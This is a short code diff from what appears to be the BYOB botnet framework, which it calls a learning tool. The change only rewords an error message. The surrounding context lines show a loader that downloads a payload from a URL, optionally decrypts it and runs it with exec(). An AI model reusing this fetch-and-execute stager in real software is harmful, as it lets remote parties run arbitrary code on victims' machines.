@@ -63,4 +63,4 @@ def run(url=None, key=None):
             payload = decrypt(urlopen(url).read(), base64.b64decode(key)) if key else urlopen(url).read()
             exec(payload, globals())
         else:
-            sys.exit("Error: You may not use byob on a real computer try a vm next time or contact us on discord for help.")
+            sys.exit("Error: you may not use BYOB on a real computer as it is designed to be used as a learning tool.")
